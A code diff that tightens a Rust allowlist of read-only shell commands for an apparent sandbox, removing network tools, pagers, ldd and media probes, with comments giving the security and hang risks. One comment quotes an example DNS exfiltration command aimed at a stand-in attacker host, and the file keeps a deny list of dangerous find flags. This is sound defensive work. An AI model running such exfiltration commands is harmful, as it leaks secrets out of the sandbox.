@@ -210,22 +210,18 @@ const READ_ONLY_PURE: &[&str] = &[
     // Process inspection
     "ps",
     "pgrep",
-    "top",
+    // `top`, `htop`, `watch` are interactive and would hang the PTY (M3).
     "lsof",
     "vmstat",
     "iostat",
     "free",
-    // Network diagnostics
-    "dig",
-    "nslookup",
-    "host",
-    "ping",
-    "traceroute",
-    "tracepath",
-    "mtr",
+    // Network diagnostics: only `netstat`, which reads local tables. dig,
+    // nslookup, host, ping, traceroute, tracepath and mtr are not here (I3):
+    // the sandbox shares the network, so they are an exfiltration channel
+    // (`dig $secret.evil.example`). Divergence from da.
     "netstat",
-    // Binary inspection
-    "ldd",
+    // Binary inspection. `ldd` is not here (I4): glibc's ldd can run the
+    // inspected binary's loader. Divergence from da.
     "nm",
     "objdump",
     "readelf",
@@ -249,8 +245,10 @@ const READ_ONLY_PURE: &[&str] = &[
     // Environment
     "printenv",
     // Media / document metadata
+    // `identify` (ImageMagick delegates), `ffprobe` and `mediainfo` (follow
+    // URLs / playlists in attacker files) and `soxi` (sox opens `|cmd` and
+    // URLs) are not here (I4). Divergence from da.
     "pdfinfo",
-    "soxi",
     // Terminal
     "clear",
     "tput",
@@ -259,7 +257,6 @@ const READ_ONLY_PURE: &[&str] = &[
     // Misc
     "seq",
     "expr",
-    "bc",
     "od",
     "hexdump",
     "sleep",
@@ -268,13 +265,6 @@ const READ_ONLY_PURE: &[&str] = &[
 const FIND_DANGEROUS: &[&str] = &[
     "-exec", "-execdir", "-delete", "-ok", "-okdir", "-fprint", "-fprint0", "-fprintf", "-fls",
 ];
-
-const PAGER: Unsafe = Unsafe {
-    short: "oO",
-    long: &["log-file", "LOG-FILE"],
-    exact: &[],
-    end_of_options: true,
-};
 
 fn read_only_verify(seg: &Segment, _path: Option<&Path>) -> Option<Verdict> {
     if seg.argv.is_empty() || seg.is_dynamic(0) {
@@ -333,9 +323,10 @@ fn read_only_checked(bin: &str, seg: &Segment) -> bool {
         // -C compiles a magic file
         "file" => flags("C", &["compile"], &[], false),
         "base64" => flags("o", &["output"], &[], false),
-        "less" | "more" | "zless" | "zmore" | "xzless" | "xzmore" | "bzmore" => {
-            flags_safe(seg, &PAGER) && !argv.iter().skip(1).any(|t| t.starts_with('+'))
-        }
+        // M3: `less`/`more`/`zless`/…, `man` and `info` page through a TTY
+        // pager and would hang the PTY until the command timeout; they are
+        // not approved (divergence from da). Likewise `top`, `htop`, `watch`,
+        // `bc`/`dc`.
         "bat" => {
             flags(
                 "",
@@ -387,18 +378,9 @@ fn read_only_checked(bin: &str, seg: &Segment) -> bool {
         // `hash -p PATH NAME` remaps a later command
         "hash" => flags("pd", &[], &[], false),
         "command" => command_lookup(seg),
-        "man" => flags("PH", &["pager", "html"], &[], false),
-        "info" => flags("o", &["output"], &[], false),
         "tldr" => flags("uc", &["update", "clear-cache"], &[], false),
-        "ffprobe" => flags("", &[], &["-o", "-report"], false),
-        "mediainfo" => {
-            !seg.has_dynamic()
-                && !argv
-                    .iter()
-                    .skip(1)
-                    .any(|t| t.to_ascii_lowercase().starts_with("--logfile"))
-        }
-        "identify" => flags("", &[], &["-write", "+write"], false),
+        // I4: `ffprobe`, `mediainfo` and `identify` are not approved (they
+        // follow URLs/delegates named by attacker-controlled files).
         // second operand is the output file
         "xxd" => !seg.has_dynamic() && operand_count(argv, XXD_VALUE_FLAGS) <= 1,
         "cloc" => cloc_safe(seg),
@@ -1463,8 +1445,6 @@ mod tests {
         assert!(approves("cat README.md", p));
         assert!(approves("jq '.name' package.json", p));
         assert!(approves("ps aux", p));
-        assert!(approves("dig example.com", p));
-        assert!(approves("ping -c 1 example.com", p));
     }
 
     #[test]
